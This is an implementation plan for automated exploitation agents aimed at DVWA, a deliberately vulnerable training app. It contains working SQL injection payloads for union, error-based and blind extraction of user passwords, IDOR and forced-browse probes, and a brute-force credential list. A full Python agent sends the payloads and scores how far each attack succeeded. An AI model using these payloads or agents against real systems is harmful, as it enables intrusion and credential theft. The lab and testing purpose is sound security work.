# Stage 9A Implementation Plan — Real Method Agent Execution

## Manifest

- `module_name`: `stage-9a-real-method-agents`
- `output_filename`: `stage-9a-real-method-agents.implementation-plan.md`
- `repo_root`: `.`
- `language`: `python`
- `test_command`: `pytest -q`
- `ruleset_files`:
  - `AGENTS.md`
  - `docs/summary.md`
- `files_to_create`:
  - `tests/test_sqli_union_agent.py`
  - `tests/test_sqli_error_agent.py`
  - `tests/test_sqli_boolean_blind_agent.py`
  - `tests/test_sqli_time_blind_agent.py`
  - `tests/test_ac_idor_agent.py`
  - `tests/test_ac_vertical_escalation_agent.py`
  - `tests/test_ac_force_browse_agent.py`
  - `tests/test_bf_dictionary_agent.py`
  - `tests/test_bf_spray_agent.py`
- `files_to_modify`:
  - `agents/sqli/sqli_union_agent.py`
  - `agents/sqli/sqli_error_agent.py`
  - `agents/sqli/sqli_boolean_blind_agent.py`
  - `agents/sqli/sqli_time_blind_agent.py`
  - `agents/access_control/ac_idor_agent.py`
  - `agents/access_control/ac_vertical_escalation_agent.py`
  - `agents/access_control/ac_force_browse_agent.py`
  - `agents/brute_force/bf_dictionary_agent.py`
  - `agents/brute_force/bf_spray_agent.py`
  - `agents/state_utils.py`
  - `foundation/payload_library.py`
- `tests_to_add`:
  - `tests/test_sqli_union_agent.py`
  - `tests/test_sqli_error_agent.py`
  - `tests/test_sqli_boolean_blind_agent.py`
  - `tests/test_sqli_time_blind_agent.py`
  - `tests/test_ac_idor_agent.py`
  - `tests/test_ac_vertical_escalation_agent.py`
  - `tests/test_ac_force_browse_agent.py`
  - `tests/test_bf_dictionary_agent.py`
  - `tests/test_bf_spray_agent.py`

## Short summary

This plan rewrites all 9 method agents from non-functional stubs into real HTTP-exploitation agents that send payloads to DVWA, parse responses, and verify preconditions / exploitation evidence. This is the single critical blocker identified in `docs/audit-codebase-compliance-report.md` (Priority 1). Every agent follows the canonical **PROBE -> EXPLOIT -> CHAIN CHECK** pipeline from `AGENTS.md`.

## Inputs & preconditions

1. `foundation/session_manager.py` — `DVWASession` with `login()`, `set_security_level()`, `get()`, `post()` is fully implemented.
2. `foundation/http_client.py` — `HTTPClient` with `get()`/`post()` returning `RequestResult` (`.text`, `.status_code`, `.url`).
3. `foundation/payload_library.py` — `PayloadLibrary.get(agent_id, security_level)` returns `PayloadSet` (probe, exploit, bypass).
4. `foundation/verifier.py` — `Verifier.contains_any()`, `regex_match()` are implemented.
5. `core/knowledge_graph.py` — `AttackKnowledgeGraph.get_next_actions(node)` returns edges with `is_chain`, `preconditions`, `target_agent`.
6. `core/state.py` — `ExploitationState` schema is frozen; `MODULE_TO_KG_NODE` maps agent IDs to canonical confirmed nodes.
7. `agents/state_utils.py` — `make_update()`, `normalize_security_level()`, `merge_scores()`, `merge_tried_payloads()` are stable.

## Design & architecture

### Canonical agent pipeline (every agent)

```
Stage 1: PROBE
  - Create DVWASession from state["target_url"]
  - Login and set security level
  - Send probe payloads via session.get()/post()
  - Parse response for precondition signals
  - If precondition NOT met -> score=0, reason="precondition_unmet"
  - If confirmed -> score=1, update observations dict

Stage 2: EXPLOIT
  - Try exploit + bypass payloads from PayloadLibrary
  - Track all tried payloads in state.tried_payloads[agent_id]
  - Parse response for exploitation success indicators
  - Partial success -> score=2
  - Full success -> score=3; append surface-confirmed node to confirmed_vulns

Stage 3: CHAIN CHECK
  - Instantiate AttackKnowledgeGraph
  - Call kg.get_next_actions(surface_confirmed_node)
  - For each chain edge (is_chain=True): verify all preconditions in state["confirmed_vulns"]
  - If chain condition met -> score=4; append chain target to achieved_outcomes

Return: partial state update dict via make_update()
```

### Confirmed node IDs (from `MODULE_TO_KG_NODE`)

| Agent ID | Confirmed Node to Append |
|---|---|
| `sqli_union` | `sqli_confirmed` |
| `sqli_error` | `sqli_confirmed` |
| `sqli_boolean_blind` | `blind_sqli_confirmed` |
| `sqli_time_blind` | `blind_sqli_confirmed` |
| `ac_idor` | `access_control_confirmed` |
| `ac_vertical_escalation` | `access_control_confirmed` |
| `ac_force_browse` | `access_control_confirmed` |
| `bf_dictionary` | `brute_force_confirmed` |
| `bf_spray` | `brute_force_confirmed` |

### Chain outcomes per surface (from AKG edges)

| Source Confirmed Node | Chain Target (achieved_outcomes) |
|---|---|
| `sqli_confirmed` | `credentials_extracted` |
| `blind_sqli_confirmed` | `credentials_extracted` |
| `access_control_confirmed` | `data_exfiltrated` (default) |
| `brute_force_confirmed` | `authenticated_session` |

Note: The chaining coordinator (not the agent) handles cross-surface **routing** to the next agent. The agent's chain check only appends **outcome nodes** to `achieved_outcomes` when the AKG edge preconditions are satisfied.

### DVWA endpoint mappings

| Agent | Module Path | Parameter Key |
|---|---|---|
| `sqli_union` | `/vulnerabilities/sqli/` | `id` |
| `sqli_error` | `/vulnerabilities/sqli/` | `id` |
| `sqli_boolean_blind` | `/vulnerabilities/sqli_blind/` | `id` |
| `sqli_time_blind` | `/vulnerabilities/sqli_blind/` | `id` |
| `ac_idor` | `/vulnerabilities/authbypass/` | `userId` |
| `ac_vertical_escalation` | `/vulnerabilities/authbypass/` | `userId`, `role` |
| `ac_force_browse` | (direct path access) | path traversal |
| `bf_dictionary` | `/vulnerabilities/brute/` | `username`, `password`, `Login` |
| `bf_spray` | `/vulnerabilities/brute/` | `username`, `password`, `Login` |

## Files to modify

### 1. `agents/state_utils.py`

Add method-agent ID to fallback path mapping in `module_endpoint()` so the 9 deep-method agents can resolve their DVWA endpoints.

```python
fallback_path_fragments.update({
    "sqli_union": "/vulnerabilities/sqli/",
    "sqli_error": "/vulnerabilities/sqli/",
    "sqli_boolean_blind": "/vulnerabilities/sqli_blind/",
    "sqli_time_blind": "/vulnerabilities/sqli_blind/",
    "ac_idor": "/vulnerabilities/authbypass/",
    "ac_vertical_escalation": "/vulnerabilities/authbypass/",
    "ac_force_browse": "/vulnerabilities/authbypass/",
    "bf_dictionary": "/vulnerabilities/brute/",
    "bf_spray": "/vulnerabilities/brute/",
})
```

Also add a helper for deduplicating `achieved_outcomes` in `make_update()` (already present; verify it works for chain outcomes).

### 2. `foundation/payload_library.py`

Update payloads to be DVWA-realistic for each security level. Key changes:

- **sqli_union**: `probe` should include column-count probes (`1' ORDER BY 1-- -`, `1' ORDER BY 2-- -`, `1' UNION SELECT null-- -`). `exploit` should include credential extraction (`1' UNION SELECT user,password FROM users-- -`).
- **sqli_error**: `probe` should include basic syntax breakers (`1'`, `1''`, `1"`). `exploit` should include version extraction (`1' AND 1=0 UNION SELECT null,version()-- -`).
- **sqli_boolean_blind**: `probe` should include truthy/falsy pairs (`1' AND 1=1-- -`, `1' AND 1=2-- -`). `exploit` should include a single character probe (`1' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'-- -`).
- **sqli_time_blind**: `probe` should include `1' AND SLEEP(3)-- -`. `exploit` should include a conditional delay probe.
- **ac_idor**: `probe` should be `userId=1`, `userId=2`, etc. `exploit` should enumerate additional IDs.
- **ac_vertical_escalation**: `probe` should test role parameter (`role=user`, `role=admin`).
- **ac_force_browse**: `probe` should test direct access to `/admin/`, `/config/`, `/backup/`.
- **bf_dictionary**: `probe` should be rapid test requests. `exploit` should include known DVWA credential pairs: `("admin","password")`, `("gordonb","abc123")`, `("pablo","letmein")`, `("smithy","password")`.
- **bf_spray**: `probe` similar to dictionary. `exploit` should spray common combos across usernames.

### 3. `agents/sqli/sqli_union_agent.py`

Replace stub with real HTTP pipeline:

```python
"""SQLi Union-based injection agent."""
from __future__ import annotations

import logging
from typing import Any

from agents.agent_telemetry import exploit_event, probe_event, score_event
from agents.state_utils import make_update, normalize_security_level
from core.knowledge_graph import AttackKnowledgeGraph
from core.state import ExploitationState, MODULE_TO_KG_NODE
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier

logger = logging.getLogger(__name__)

AGENT_ID = "sqli_union"
SURFACE = "sqli"
MODULE_PATH = "/vulnerabilities/sqli/"
_PROBE_OBSERVATION_KEY = "union_select_possible"


def _probe_preconditions(session: DVWASession, payloads: list[str], already_tried: set[str]) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
    """Send probe payloads and detect if UNION SELECT is possible.

    Returns: (precondition_met, tried_payloads, observations, telemetry_events)
    """
    observations: dict[str, bool] = {}
    tried: list[str] = []
    events: list[dict] = []
    verifier = Verifier()

    for payload in payloads:
        if payload in already_tried:
            continue
        tried.append(payload)
        try:
            resp = session.get(MODULE_PATH, params={"id": payload, "Submit": "Submit"})
            events.append(probe_event(AGENT_ID, payload, resp.status_code, True))
            # Signal: page renders without fatal error and contains expected DVWA output structure
            if resp.status_code == 200 and "First name" in resp.text:
                observations[_PROBE_OBSERVATION_KEY] = True
                return True, tried, observations, events
        except Exception as exc:
            logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
            events.append(probe_event(AGENT_ID, payload, None, False))

    observations[_PROBE_OBSERVATION_KEY] = False
    return False, tried, observations, events


def _attempt_exploit(session: DVWASession, payloads: list[str], already_tried: set[str]) -> tuple[int, list[str], list[str], list[dict]]:
    """Attempt exploitation and return score + confirmed nodes.

    Returns: (score, tried_payloads, confirmed_vulns, telemetry_events)
    """
    tried: list[str] = []
    events: list[dict] = []
    confirmed: list[str] = []
    score = 0
    verifier = Verifier()

    for payload in payloads:
        if payload in already_tried:
            continue
        tried.append(payload)
        try:
            resp = session.get(MODULE_PATH, params={"id": payload, "Submit": "Submit"})
            events.append(exploit_event(AGENT_ID, payload, resp.status_code, True))
            # Full exploit: credentials appear in response
            if resp.status_code == 200 and verifier.contains_any(resp.text, ["admin", "password", "gordonb", "pablo"]).ok:
                score = max(score, 3)
                confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
                break
            # Partial: page renders with modified output but no clear credential extraction
            elif resp.status_code == 200 and "First name" in resp.text:
                score = max(score, 2)
        except Exception as exc:
            logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
            events.append(exploit_event(AGENT_ID, payload, None, False))

    return score, tried, confirmed, events


def _chain_check(confirmed_node: str, state: ExploitationState) -> tuple[int, list[str]]:
    """Query AKG for chain edges and check preconditions against confirmed_vulns."""
    achieved: list[str] = []
    score = 0
    kg = AttackKnowledgeGraph()
    confirmed_set = set(state.get("confirmed_vulns", []))

    for edge in kg.get_next_actions(confirmed_node):
        if not edge.get("is_chain"):
            continue
        preconditions = edge.get("preconditions", [])
        if all(p in confirmed_set for p in preconditions):
            achieved.append(edge["target"])
            score = 4

    return score, achieved


def sqli_union_agent(state: ExploitationState) -> dict[str, Any]:
    target_url = state.get("target_url", "")
    security_level = normalize_security_level(state.get("security_level"))

    if not target_url:
        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])

    session = DVWASession(target_url)
    try:
        if not session.login():
            return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])
        session.set_security_level(security_level)
    except Exception as exc:
        logger.warning("[%s] Session setup failed: %s", AGENT_ID, exc)
        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])

    payload_lib = PayloadLibrary()
    payload_set = payload_lib.get(AGENT_ID, security_level)

    already_tried = already_tried_payloads(state, AGENT_ID)
    observations: dict[str, bool] = dict(state.get("observations", {}))
    confirmed_vulns: list[str] = []
    achieved_outcomes: list[str] = []
    score = 0
    telemetry_events: list[dict[str, Any]] = []
    all_tried: list[str] = []

    # Stage 1: PROBE
    probe_payloads = list(payload_set.probe) or ["1' ORDER BY 1-- -", "1' UNION SELECT null-- -"]
    probe_ok, tried, probe_obs, probe_events = _probe_preconditions(session, probe_payloads, already_tried)
    all_tried.extend(tried)
    telemetry_events.extend(probe_events)
    observations.update(probe_obs)

    if not probe_ok:
        return make_update(
            state=state,
            module_name=AGENT_ID,
            score=0,
            tried_payloads=all_tried,
            telemetry_events=telemetry_events,
        )

    score = max(score, 1)

    # Stage 2: EXPLOIT
    exploit_payloads = list(payload_set.exploit) or ["1' UNION SELECT user,password FROM users-- -"]
    bypass_payloads = list(payload_set.bypass.get(security_level, []))
    all_exploit = exploit_payloads + bypass_payloads

    exploit_score, tried, confirmed, exploit_events = _attempt_exploit(session, all_exploit, already_tried | set(all_tried))
    all_tried.extend(tried)
    telemetry_events.extend(exploit_events)
    score = max(score, exploit_score)
    confirmed_vulns.extend(confirmed)

    # Stage 3: CHAIN CHECK
    if confirmed_vulns:
        confirmed_node = confirmed_vulns[0]  # surface-confirmed node
        chain_score, chain_achieved = _chain_check(confirmed_node, state)
        if chain_score >= 4:
            score = max(score, chain_score)
            achieved_outcomes.extend(chain_achieved)

    telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))

    update = make_update(
        state=state,
        module_name=AGENT_ID,
        score=score,
        tried_payloads=all_tried,
        confirmed_vulns=confirmed_vulns or None,
        achieved_outcomes=achieved_outcomes or None,
        telemetry_events=telemetry_events,
    )
    update["observations"] = observations
    return update
```

> Note: The above is a **representative template** for `sqli_union_agent.py`. All 9 agents follow this identical structural pattern with surface-specific probe/exploit/chain logic.

### 4. `agents/sqli/sqli_error_agent.py`

Same structural template. Key differences:
- `AGENT_ID = "sqli_error"`
- `MODULE_PATH = "/vulnerabilities/sqli/"`
- PROBE signal: MySQL error message in response (e.g., "You have an error in your SQL syntax", "Unknown column").
- EXPLOIT signal: Extracted database version or schema info in error message.
- Confirmed node: `sqli_confirmed`.

### 5. `agents/sqli/sqli_boolean_blind_agent.py`

Same structural template. Key differences:
- `AGENT_ID = "sqli_boolean_blind"`
- `MODULE_PATH = "/vulnerabilities/sqli_blind/"`
- PROBE: Send truthy (`1' AND 1=1-- -`) and falsy (`1' AND 1=2-- -`) payloads. Compare response text lengths or presence of "User ID exists" string.
- EXPLOIT: Send a single character extraction payload. Verify that truthy/falsy distinction holds for a known character.
- Confirmed node: `blind_sqli_confirmed`.

### 6. `agents/sqli/sqli_time_blind_agent.py`

Same structural template. Key differences:
- `AGENT_ID = "sqli_time_blind"`
- `MODULE_PATH = "/vulnerabilities/sqli_blind/"`
- PROBE: Send `1' AND SLEEP(3)-- -`. Measure response elapsed time. If delay > 2.5s, precondition met.
- EXPLOIT: Send conditional delay payload (`1' AND IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>77,SLEEP(3),0)-- -`). Measure delay.
- Confirmed node: `blind_sqli_confirmed`.

### 7. `agents/access_control/ac_idor_agent.py`

Same structural template. Key differences:
- `AGENT_ID = "ac_idor"`
- `MODULE_PATH = "/vulnerabilities/authbypass/"`
- PROBE: Send `userId=1` (baseline), then `userId=2`, `userId=3`. Compare response lengths/content. If different user data returned, `object_ids_enumerable = True`.
- EXPLOIT: Enumerate additional IDs. If unauthorized data access confirmed, score=3.
- Confirmed node: `access_control_confirmed`.

### 8. `agents/access_control/ac_vertical_escalation_agent.py`

Same structural template. Key differences:
- `AGENT_ID = "ac_vertical_escalation"`
- `MODULE_PATH = "/vulnerabilities/authbypass/"` or admin pages
- PROBE: Test role parameter escalation (`role=admin`). Check if admin-specific content appears.
- EXPLOIT: Confirm vertical escalation by accessing admin-only functionality.
- Confirmed node: `access_control_confirmed`.

### 9. `agents/access_control/ac_force_browse_agent.py`

Same structural template. Key differences:
- `AGENT_ID = "ac_force_browse"`
- PROBE: Direct GET to `/admin/`, `/config.php`, `/backup/`. Check if 200 OK instead of 403/redirect to login.
- EXPLOIT: Access protected resource successfully.
- Confirmed node: `access_control_confirmed`.

### 10. `agents/brute_force/bf_dictionary_agent.py`

Same structural template. Key differences:
- `AGENT_ID = "bf_dictionary"`
- `MODULE_PATH = "/vulnerabilities/brute/"`
- PROBE: Send 3 rapid requests. If total elapsed < 2s, `no_rate_limit = True`.
- EXPLOIT: Iterate credential pairs. Check response for "Welcome to the password protected area" or absence of "incorrect".
- On medium security: `time.sleep(0.5)` between requests.
- On high security: CAPTCHA is a scope boundary; if CAPTCHA detected, return score=1 with observation.
- Confirmed node: `brute_force_confirmed`.
- Found credentials: append real successful credentials from response to `found_credentials`.

### 11. `agents/brute_force/bf_spray_agent.py`

Same structural template. Key differences:
- `AGENT_ID = "bf_spray"`
- `MODULE_PATH = "/vulnerabilities/brute/"`
- PROBE: Same rate-limit probe as dictionary.
- EXPLOIT: Spray common password across multiple usernames.
- Confirmed node: `brute_force_confirmed`.

## Files to create

### Per-agent unit tests (9 files)

Each test file validates PROBE, EXPLOIT, and CHAIN CHECK stages with mocked `DVWASession`.

Representative test (`tests/test_sqli_union_agent.py`):

```python
import pytest
from unittest.mock import MagicMock, patch

from agents.sqli.sqli_union_agent import sqli_union_agent
from core.state import new_default_state


@pytest.fixture
def base_state():
    return new_default_state()


def test_probe_precondition_unmet(base_state):
    base_state["target_url"] = "http://localhost/dvwa"
    base_state["security_level"] = "low"

    mock_session = MagicMock()
    mock_session.login.return_value = True
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.text = "No results"  # DVWA returns this when query fails
    mock_session.get.return_value = mock_resp

    with patch("agents.sqli.sqli_union_agent.DVWASession", return_value=mock_session):
        result = sqli_union_agent(base_state)

    assert result["scores"]["sqli_union"] == 0
    assert result["observations"].get("union_select_possible") is False


def test_exploit_full_success(base_state):
    base_state["target_url"] = "http://localhost/dvwa"
    base_state["security_level"] = "low"

    mock_session = MagicMock()
    mock_session.login.return_value = True

    def mock_get(path, params=None):
        resp = MagicMock()
        resp.status_code = 200
        payload = (params or {}).get("id", "")
        if "UNION" in payload and "users" in payload:
            resp.text = "First name: admin<br>Surname: password"
        else:
            resp.text = "First name: test<br>Surname: test"
        return resp

    mock_session.get.side_effect = mock_get

    with patch("agents.sqli.sqli_union_agent.DVWASession", return_value=mock_session):
        result = sqli_union_agent(base_state)

    assert result["scores"]["sqli_union"] == 3
    assert "sqli_confirmed" in result.get("confirmed_vulns", [])


def test_chain_check_triggers_score_four(base_state):
    base_state["target_url"] = "http://localhost/dvwa"
    base_state["security_level"] = "low"
    base_state["confirmed_vulns"] = ["sqli_confirmed"]  # precondition already met

    mock_session = MagicMock()
    mock_session.login.return_value = True
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.text = "First name: admin<br>Surname: password"
    mock_session.get.return_value = mock_resp

    with patch("agents.sqli.sqli_union_agent.DVWASession", return_value=mock_session):
        result = sqli_union_agent(base_state)

    assert result["scores"]["sqli_union"] == 4
    assert "credentials_extracted" in result.get("achieved_outcomes", [])
```

## Public API and Interface Definitions

### Agent node signature (unchanged)

```python
def <agent_id>(state: ExploitationState) -> dict[str, Any]: ...
```

### Internal helper contract (new)

```python
def _probe_preconditions(session, payloads, already_tried) -> tuple[bool, list[str], dict[str, bool], list[dict]]: ...
def _attempt_exploit(session, payloads, already_tried) -> tuple[int, list[str], list[str], list[dict]]: ...
def _chain_check(confirmed_node, state) -> tuple[int, list[str]]: ...
```

## Tests to Add

- `tests/test_sqli_union_agent.py` — probe fail, probe success, exploit partial, exploit full, chain score 4
- `tests/test_sqli_error_agent.py` — error message detection, version extraction, chain
- `tests/test_sqli_boolean_blind_agent.py` — response diff detection, single char extraction, chain
- `tests/test_sqli_time_blind_agent.py` — timing delay detection, conditional delay, chain
- `tests/test_ac_idor_agent.py` — ID enumeration, unauthorized access, chain
- `tests/test_ac_vertical_escalation_agent.py` — role escalation, admin access, chain
- `tests/test_ac_force_browse_agent.py` — direct access probe, protected resource access
- `tests/test_bf_dictionary_agent.py` — rate limit probe, credential success, found_credentials, chain
- `tests/test_bf_spray_agent.py` — spray pattern, credential success, chain

## How to Run and Validate

1. Run foundation tests:
```bash
pytest -q tests/test_payload_library.py tests/test_verifier.py tests/test_session_manager.py
```

2. Run new agent tests:
```bash
pytest -q tests/test_sqli_*.py tests/test_ac_*.py tests/test_bf_*.py
```

3. Run runtime compatibility:
```bash
pytest -q tests/test_graph_builder.py tests/test_chaining_coordinator.py tests/test_orchestrator.py
```

4. Full regression:
```bash
pytest -q
```

Expected outcome: all new agent tests pass; existing tests remain green; agents send real HTTP requests (verified via mocks in tests).

## Backwards Compatibility and Migration Steps

1. Keep all LangGraph node names unchanged (`sqli_union`, `sqli_error`, etc.).
2. Keep `ExploitationState` schema unchanged.
3. Agent return dict shape remains identical (scores, confirmed_vulns, tried_payloads, observations, telemetry_events).
4. The only behavioral change is that agents now perform real HTTP instead of local iteration.

## Error Handling and Edge Cases

- **Session login failure**: Return score=0, log warning, do not crash.
- **Network timeout during probe/exploit**: Log warning, append error marker to telemetry, continue to next payload.
- **Missing target_url**: Return score=0 immediately.
- **Empty payload library**: Fall back to hardcoded `_DEFAULT_PROBE` / `_DEFAULT_EXPLOIT` / `_DEFAULT_BYPASS`.
- **All payloads already tried**: Return current best score without re-sending.
- **CAPTCHA on brute force high**: Detect CAPTCHA image/field in response, return score=1 (precondition met but exploitation blocked by scope boundary).
- **DVWA module not installed** (e.g., authbypass): Return score=0 with note in telemetry.

## Rollback Plan

1. Each agent file change is self-contained; revert any single agent to its stub by restoring the previous version.
2. If real HTTP causes CI failures (no DVWA available), mock `DVWASession` in tests and mark integration tests with `@pytest.mark.integration`.

## Acceptance Criteria

- [ ] All 9 agents send real HTTP requests via `DVWASession` during PROBE and EXPLOIT stages.
- [ ] All 9 agents parse HTTP responses to determine precondition satisfaction and exploitation success.
- [ ] All 9 agents append correct surface-level confirmed nodes (`sqli_confirmed`, `blind_sqli_confirmed`, `access_control_confirmed`, `brute_force_confirmed`).
- [ ] All 9 agents query `AttackKnowledgeGraph.get_next_actions()` during CHAIN CHECK and append chain outcomes only when preconditions are satisfied.
- [ ] All 9 agents update `state.tried_payloads[agent_id]` with every payload sent.
- [ ] All 9 agents return partial state update dicts (no direct state mutation).
- [ ] New unit tests for all 9 agents pass with mocked sessions.
- [ ] Existing 342 tests remain green.

## Estimated effort

- Overall: **High** (~24–30 hours).
- Breakdown:
  - SQLi agents (4): **10–12h**
  - Access Control agents (3): **6–8h**
  - Brute Force agents (2): **4–6h**
  - Unit tests (9 files): **4h**

## Suggested git branch name and commit message

- Branch: `feat/stage9a-real-method-agents`
- Commit message: `feat(stage9a): rewrite all 9 method agents with real DVWA HTTP execution`
